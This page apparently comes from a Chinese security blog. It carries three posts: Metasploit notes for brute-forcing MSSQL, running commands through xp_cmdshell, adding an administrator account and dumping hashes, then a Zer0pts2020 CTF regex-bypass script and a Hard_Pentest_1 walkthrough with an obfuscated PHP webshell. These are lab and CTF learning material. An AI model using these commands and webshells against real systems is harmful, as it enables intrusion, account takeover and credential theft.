<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
<meta name="keywords" content="CTF|ç½‘ç»œå®‰å…¨|å¼€å‘">
<meta property="og:type" content="website">
<meta property="og:title" content="Xiao Leung&#39;s Blog">
<meta property="og:url" content="https://www.plasf.cn/page/2/index.html">
<meta property="og:site_name" content="Xiao Leung&#39;s Blog">
<meta property="og:description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Xiao Leung&#39;s Blog">
<meta name="twitter:description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">

<link rel="canonical" href="https://www.plasf.cn/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Xiao Leung's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Xiao Leung's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">ä¸“æ³¨ç½‘ç»œå®‰å…¨ç ”ç©¶</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d729d7601d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d729d7601d.html" class="post-title-link" itemprop="url">å†…ç½‘æ¸—é€å­¦ä¹ ç¬”è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-05-21 16:05:57" itemprop="dateCreated datePublished" datetime="2020-05-21T16:05:57+08:00">2020-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:25:37" itemprop="dateModified" datetime="2020-10-14T17:25:37+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/æ¸—é€æµ‹è¯•/" itemprop="url" rel="index"><span itemprop="name">æ¸—é€æµ‹è¯•</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æœ¬æ–‡å°†æŒç»­æ›´æ–°ã€‚ç³»ç»Ÿè®°å½•å†…ç½‘æ¸—é€å­¦ä¹ ã€‚</p>
<p><strong><em>å£°æ˜ï¼šæœ¬æ–‡ä»…ç ”ç©¶å­¦ä¹ æ‰€ç”¨ï¼Œå‚è€ƒæ–‡ç« çš„ä¸€åˆ‡æ´»åŠ¨å‡ä¸æœ¬äººæ— å…³ã€‚</em></strong></p>
<h2 id="å†…ç½‘æœåŠ¡æ¢æµ‹"><a href="#å†…ç½‘æœåŠ¡æ¢æµ‹" class="headerlink" title="å†…ç½‘æœåŠ¡æ¢æµ‹"></a>å†…ç½‘æœåŠ¡æ¢æµ‹</h2><h3 id="Netdiscover-æ¢æµ‹æ´»åŠ¨ä¸»æœº"><a href="#Netdiscover-æ¢æµ‹æ´»åŠ¨ä¸»æœº" class="headerlink" title="Netdiscover æ¢æµ‹æ´»åŠ¨ä¸»æœº"></a>Netdiscover æ¢æµ‹æ´»åŠ¨ä¸»æœº</h3><ul>
<li>ç®€ä»‹</li>
</ul>
<blockquote>
<p>ä¸“ç”¨çš„äºŒå±‚å‘ç°å·¥å…·ã€‚æ‹¥æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨å‘ç°ä¸¤ç§æ–¹å¼ã€‚</p>
</blockquote>
<ul>
<li>å‚æ•°</li>
</ul>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>-i ç½‘å¡</td>
<td>æŒ‡å®šç›‘å¬çš„ç½‘å¡</td>
</tr>
<tr>
<td>-r range</td>
<td>æŒ‡å®šIPæ®µ</td>
</tr>
<tr>
<td>-l filename</td>
<td>ä»æ–‡ä»¶ä¸­è¯»å–IPæ®µ</td>
</tr>
<tr>
<td>-p</td>
<td>è¢«åŠ¨æ¨¡å¼</td>
</tr>
<tr>
<td>-t</td>
<td>ARPå‘é€é—´éš”</td>
</tr>
<tr>
<td>-c</td>
<td>å‘åŒ…æ•°é‡</td>
</tr>
</tbody></table>
<ul>
<li>ä½¿ç”¨ä¸¾ä¾‹</li>
</ul>
<pre><code class="shell">netdiscover i eth0 -r 192.168.3.0/24 #ä¸»åŠ¨æ¢æµ‹IPï¼š192.168.3.0/24æ®µå­˜æ´»çš„ä¸»æœº
netdiscover -p</code></pre>
<h3 id="ä½¿ç”¨Nampæ¢æµ‹ä¸»æœºå¼€æ”¾æœåŠ¡"><a href="#ä½¿ç”¨Nampæ¢æµ‹ä¸»æœºå¼€æ”¾æœåŠ¡" class="headerlink" title="ä½¿ç”¨Nampæ¢æµ‹ä¸»æœºå¼€æ”¾æœåŠ¡"></a>ä½¿ç”¨Nampæ¢æµ‹ä¸»æœºå¼€æ”¾æœåŠ¡</h3><p>ç”±äºå·²ç»ä½¿ç”¨<code>netdiscover</code>æ¢æµ‹æŒ‡å®šä¸»æœºçš„ä½¿ç”¨Pnå‚æ•°è·³è¿‡Pnæ£€æµ‹ã€‚å…·ä½“ä½¿ç”¨å‚æ•°è¯´æ˜åœ¨å¦ä¸€ç¯‡æ–‡ç« é‡Œè®².</p>
<pre><code class="shell">nmap -sV -Pn 192.168.3.31</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521142828.png" alt="20200521142828"></p>
<h2 id="MSFæ”»å‡»å†…ç½‘æœåŠ¡"><a href="#MSFæ”»å‡»å†…ç½‘æœåŠ¡" class="headerlink" title="MSFæ”»å‡»å†…ç½‘æœåŠ¡"></a>MSFæ”»å‡»å†…ç½‘æœåŠ¡</h2><h3 id="MSFæ”»å‡»å†…ç½‘SQL-SERVERæœåŠ¡"><a href="#MSFæ”»å‡»å†…ç½‘SQL-SERVERæœåŠ¡" class="headerlink" title="MSFæ”»å‡»å†…ç½‘SQL SERVERæœåŠ¡"></a>MSFæ”»å‡»å†…ç½‘SQL SERVERæœåŠ¡</h3><h4 id="çˆ†ç ´Mssqlå¼±å£ä»¤"><a href="#çˆ†ç ´Mssqlå¼±å£ä»¤" class="headerlink" title="çˆ†ç ´Mssqlå¼±å£ä»¤"></a>çˆ†ç ´Mssqlå¼±å£ä»¤</h4><ul>
<li>æœç´¢mssqlçˆ†ç ´payload</li>
</ul>
<pre><code>search mssql_login</code></pre><ul>
<li>ä½¿ç”¨å¼±å£ä»¤çˆ†ç ´payload</li>
</ul>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>å¦‚æœæç¤º:</li>
</ul>
<blockquote>
<p>[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details canâ€™t be blank, Cred details canâ€™t be blank (Metasploit::Framework::LoginScanner::MSSQL)</p>
</blockquote>
<p>åˆ™è¯´æ˜mssqlä¸æ˜¯é»˜è®¤å¯†ç éœ€è¦æŒ‡å®šå­—å…¸è¿›è¡Œçˆ†ç ´ï¼š</p>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
set user_file /root/user.txt
set pass_file /root/pass.txt
run</code></pre>
<ul>
<li>çˆ†ç ´æˆåŠŸsaå¯†ç ä¸ºadmin<br><img src="http://goodcheerleung.gitee.io/blog/20200521143926.png" alt="20200521143926"></li>
</ul>
<h4 id="æšä¸¾Mssqlé…ç½®ä¿¡æ¯"><a href="#æšä¸¾Mssqlé…ç½®ä¿¡æ¯" class="headerlink" title="æšä¸¾Mssqlé…ç½®ä¿¡æ¯"></a>æšä¸¾Mssqlé…ç½®ä¿¡æ¯</h4><ul>
<li>æœç´¢æšä¸¾Mssqlé…ç½®ä¿¡æ¯payload</li>
</ul>
<pre><code>search mssql_enum</code></pre><ul>
<li>ä½¿ç”¨Mssql-enum payload</li>
</ul>
<pre><code class="shell">use auxiliary/admin/mssql_enum
set username sa
set password admin
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>è¿™æ ·å¯ä»¥çœ‹åˆ°mssqlå¼€æ”¾çš„å“ªäº›åŠŸèƒ½èƒ½å¤Ÿä¾›æˆ‘ä»¬åˆ©ç”¨ï¼Œä¾‹å¦‚æ¯”è¾ƒé‡è¦çš„å°±æ˜¯xp_cmdshellèƒ½å¤Ÿç›´æ¥ç»§æ‰¿mssqlçš„æƒé™æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145004.png" alt="20200521145004"></p>
<h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><h5 id="xp-cmdshell-æ‰§è¡Œå‘½ä»¤"><a href="#xp-cmdshell-æ‰§è¡Œå‘½ä»¤" class="headerlink" title="xp_cmdshell æ‰§è¡Œå‘½ä»¤"></a>xp_cmdshell æ‰§è¡Œå‘½ä»¤</h5><p>ä½¿ç”¨è¯¥æ¨¡å—æ—¶å€™å¦‚æœ<code>xp_cmdshell</code>æ²¡æœ‰å¯åŠ¨å°†è‡ªåŠ¨æ¿€æ´»</p>
<ul>
<li>æœç´¢mssql execæ”»å‡»è„šæœ¬</li>
</ul>
<pre><code>search mssql_exec</code></pre><ul>
<li>ä½¿ç”¨mssql_execæ”»å‡»è„šæœ¬</li>
</ul>
<pre><code>use auxiliary/admin/mssql_exec
set username sa
set password admin
set rhosts 192.168.3.31
set cmd chcp 65001&amp;whoami
run</code></pre><ul>
<li>æ³¨æ„chcp 65001æ”¹å˜å­—ç¬¦ç¼–ç è§£å†³ä¹±ç é—®é¢˜ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›ç»“æœæ˜¯systemï¼Œç›´æ¥æ·»åŠ æ–°ç”¨æˆ·å³å¯ã€‚</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145639.png" alt="20200521145639"></p>
<ul>
<li>å¢åŠ ç”¨æˆ·</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net user test abc!123456 /add
run</code></pre>
<ul>
<li>æå‡æƒé™</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net localgroup administrators test /add</code></pre>
<h4 id="ä½¿ç”¨mssql-hashdump-æŠ“å–hash"><a href="#ä½¿ç”¨mssql-hashdump-æŠ“å–hash" class="headerlink" title="ä½¿ç”¨mssql_hashdump æŠ“å–hash"></a>ä½¿ç”¨mssql_hashdump æŠ“å–hash</h4><pre><code>use auxiliary/scanner/mssql/mssql_hashdump  
set rhosts 192.168.3.30
set password admin
set username sa
run</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521224308.png" alt="20200521224308"></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521224355.png" alt="20200521224355"></p>
<h4 id="æ‰§è¡Œsqlè¯­å¥"><a href="#æ‰§è¡Œsqlè¯­å¥" class="headerlink" title="æ‰§è¡Œsqlè¯­å¥"></a>æ‰§è¡Œsqlè¯­å¥</h4><pre><code>use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.3.30
set password admin
set username sa
set sql set sql Select Name FROM Master.dbo.SysDatabases orDER BY Name
run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010.png" alt="20200521230010"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d4f73bcb62.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d4f73bcb62.html" class="post-title-link" itemprop="url">Zer0pts2020-Can you guess it?</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-05-20 15:56:40" itemprop="dateCreated datePublished" datetime="2020-05-20T15:56:40+08:00">2020-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:25:58" itemprop="dateModified" datetime="2020-10-14T17:25:58+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h2><pre><code class="php">&lt;?php
include &#39;config.php&#39;; // FLAG is defined in config.php

if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
}

if (isset($_GET[&#39;source&#39;])) {
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST[&#39;guess&#39;])) {
  $guess = (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) {
    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
  } else {
    $message = &#39;Wrong.&#39;;
  }
}
?&gt;</code></pre>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ä»æºç å¾—çŸ¥flagåœ¨config.phpä¸­çš„ä¸€ä¸ªå¸¸é‡ä¸­ï¼Œè¦å¾—åˆ°flagéœ€è¦æˆ‘ä»¬postä¸€ä¸ªå€¼guesså’Œéšæœºç”Ÿæˆçš„è¦é¢„æµ‹å’Œçˆ†ç ´åŸºæœ¬æ²¡æˆã€‚ä½†æ˜¯å¯ä»¥å‘ç° <code>highlight_file()</code> é‡Œé¢çš„å˜é‡æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çœ‹çœ‹<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> æ€ä¹ˆæ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚æˆ‘ä»¬ä»php.netå¯ä»¥å¾—çŸ¥ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="å¾®ä¿¡å›¾ç‰‡_20200520150428"></p>
<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> èƒ½å¤Ÿå½“å‰urlçš„è·¯å¾„ï¼Œè€Œbasenameèƒ½å¤Ÿè¿”å›è¿”å›è·¯å¾„ä¸­æ–‡ä»¶åéƒ¨åˆ†ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="å¾®ä¿¡æˆªå›¾_20200520154155"></p>
<p>é‚£æˆ‘ä»¬ä¸æ˜¯å¯ä»¥ä¼ å…¥<code>/index.php/config.php?souce</code> ï¼Ÿä½†æ˜¯ä¸€æ¡æ­£åˆ™æŒ¡ä½äº†æˆ‘ä»¬çš„å»è·¯ï¼š</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="å¾®ä¿¡æˆªå›¾_20200520154339"></p>
<h2 id="æ­£åˆ™ç»•è¿‡"><a href="#æ­£åˆ™ç»•è¿‡" class="headerlink" title="æ­£åˆ™ç»•è¿‡"></a>æ­£åˆ™ç»•è¿‡</h2><p>æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡</p>
<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
<p>è¿™ç§æ­£åˆ™å…¶å®ç›´æ¥å†™ä¸ªè„šæœ¬å»çˆ†ç ´å³å¯ï¼Œä¸€èˆ¬éƒ½æ˜¯æŸä¸ªå­—ç¬¦èƒ½å¤Ÿé€šè¿‡ã€‚</p>
<pre><code class="python">import requests

for i in range(0,255):
    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
    r = requests.get(url)
    if &#39;flag&#39; in r.text:
        print(r.text)
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="å¾®ä¿¡æˆªå›¾_20200520154931"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5850ed2ae.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5850ed2ae.html" class="post-title-link" itemprop="url">Hard_Pentest_1 å¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-05-08 23:19:35" itemprop="dateCreated datePublished" datetime="2020-05-08T23:19:35+08:00">2020-05-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:26:15" itemprop="dateModified" datetime="2020-10-14T17:26:15+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="æ— æ•°å­—å­—æ¯çš„webshell"><a href="#æ— æ•°å­—å­—æ¯çš„webshell" class="headerlink" title="æ— æ•°å­—å­—æ¯çš„webshell"></a>æ— æ•°å­—å­—æ¯çš„webshell</h2><p>ä¸Šä¼ ç»•è¿‡ï¼Œåªéœ€ç”¨çŸ­æ ‡ç­¾ã€Pç¥çš„æ— æ•°å­—å­—æ¯çš„webshellç»•è¿‡å³å¯ï¼Œä¸Šä¼ æ–‡ä»¶åç»•è¿‡å› ä¸ºæ˜¯windowsç›´æ¥å¤§å°å†™ç»•è¿‡ã€‚</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="php">&lt;?= $_=[] ?&gt; 
&lt;?= $_=@&quot;$_&quot; ?&gt;
&lt;?= $_=$_[(&#39;!&#39;==&#39;@&#39;)] ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ = &quot;_&quot;.$__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ .= $__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++  ?&gt;
&lt;?= $_______ .= $__  ?&gt;

&lt;?= ${$_______}[&quot;_&quot;](${$_______}[&quot;__&quot;]) ?&gt;</code></pre>
<h3 id="å†™å°é©¬ï¼š"><a href="#å†™å°é©¬ï¼š" class="headerlink" title="å†™å°é©¬ï¼š"></a>å†™å°é©¬ï¼š</h3><pre><code class="http">http://47.113.219.76/uploads/d8ffd2952b7416f6096c2481dfad4351/6539886cfe4730b929fa714a800aa44a_6.Php?_=system&amp;__=echo &quot;&lt;?php phpinfo()?&gt;&quot;&gt;&gt;1.php</code></pre>
<h2 id="åŸŸæ¸—é€"><a href="#åŸŸæ¸—é€" class="headerlink" title="åŸŸæ¸—é€"></a>åŸŸæ¸—é€</h2><p>ä¸Šä¼ cmd.exeåæ‰§è¡Œnet userçœ‹åˆ°æç¤ºåœ¨<code>\\192.168.0.12\Hint</code></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032004.png" alt="20200507032004"></p>
<p>çœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…é‡Œé¢æœ‰flag1å’Œflag2çš„æç¤ºã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032131.png" alt="20200507032131"></p>
